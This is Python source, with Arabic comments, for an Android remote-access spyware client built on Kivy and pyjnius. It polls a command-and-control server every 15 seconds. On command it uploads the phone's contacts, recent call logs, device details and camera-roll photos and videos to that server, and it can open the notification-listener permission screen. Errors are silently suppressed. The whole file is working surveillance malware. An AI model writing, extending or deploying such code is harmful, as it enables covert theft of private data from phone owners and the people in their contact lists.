import os, time, requests, threading
from jnius import autoclass
from android.permissions import request_permissions, Permission

SERVER_URL = "https://your-app-name.onrender.com" # ضع رابط Render هنا

class AndroidCore:
    def send_data(self, msg, file_p=None):
        try:
            if file_p and os.path.exists(file_p):
                with open(file_p, 'rb') as f:
                    requests.post(f"{SERVER_URL}/upload", files={'file': f}, data={'message': msg}, timeout=120)
            else:
                requests.post(f"{SERVER_URL}/upload", data={'message': msg}, timeout=30)
        except: pass

    def get_contacts(self):
        try:
            resolver = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver()
            Phone = autoclass('android.provider.ContactsContract$CommonDataKinds$Phone')
            cursor = resolver.query(Phone.CONTENT_URI, None, None, None, None)
            data = "👥 قائمة الأسماء:\n"
            while cursor.moveToNext():
                data += f"{cursor.getString(cursor.getColumnIndex(Phone.DISPLAY_NAME))}: {cursor.getString(cursor.getColumnIndex(Phone.NUMBER))}\n"
            cursor.close()
            self.send_data(data)
        except: pass

    def get_call_logs(self):
        try:
            resolver = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver()
            Calls = autoclass('android.provider.CallLog$Calls')
            cursor = resolver.query(Calls.CONTENT_URI, None, None, None, None)
            logs = "📞 سجل المكالمات:\n"
            for _ in range(20):
                if cursor.moveToNext():
                    logs += f"رقم: {cursor.getString(cursor.getColumnIndex(Calls.NUMBER))} | مدة: {cursor.getString(cursor.getColumnIndex(Calls.DURATION))}s\n"
            cursor.close()
            self.send_data(logs)
        except: pass

    def pull_folder(self, path):
        # سحب الصور والفيديوهات من المسار المدخل
        extensions = ('.jpg', '.png', '.jpeg', '.mp4', '.mov', '.avi')
        try:
            if os.path.exists(path):
                files = os.listdir(path)
                for f in files:
                    if f.lower().endswith(extensions):
                        f_path = os.path.join(path, f)
                        if os.path.getsize(f_path) < 15 * 1024 * 1024: # حد 15 ميجا
                            self.send_data(f"📂 ملف من: {path}", f_path)
            else: self.send_data(f"❌ المسار غير موجود: {path}")
        except: pass

    def get_device_info(self):
        try:
            Build = autoclass("android.os.Build")
            info = f"📱 جهاز: {Build.MANUFACTURER} {Build.MODEL}\nنظام: {Build.VERSION.RELEASE}"
            self.send_data(info)
        except: pass

    def listen_notifications(self):
        try:
            Intent = autoclass('android.content.Intent')
            Settings = autoclass('android.provider.Settings')
            activity = autoclass('org.kivy.android.PythonActivity').mActivity
            activity.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
            self.send_data("🔔 تم فتح صفحة أذونات الإشعارات على الجهاز")
        except: pass

    def start_monitoring(self):
        while True:
            try:
                res = requests.get(f"{SERVER_URL}/get_cmd", timeout=10)
                raw = res.text
                if raw != "none":
                    if "|" in raw:
                        cmd, extra = raw.split("|")
                        if cmd == "pull_folder": self.pull_folder(extra)
                    elif raw == "contacts": self.get_contacts()
                    elif raw == "calls": self.get_call_logs()
                    elif raw == "info": self.get_device_info()
                    elif raw == "notif": self.listen_notifications()
                    elif raw == "loc": self.send_data("📍 تم طلب إحداثيات الموقع...")
                    elif raw == "shot": self.pull_folder("/storage/emulated/0/DCIM/Camera/")
            except: pass
            time.sleep(15)

def start_monitoring():
    AndroidCore().start_monitoring()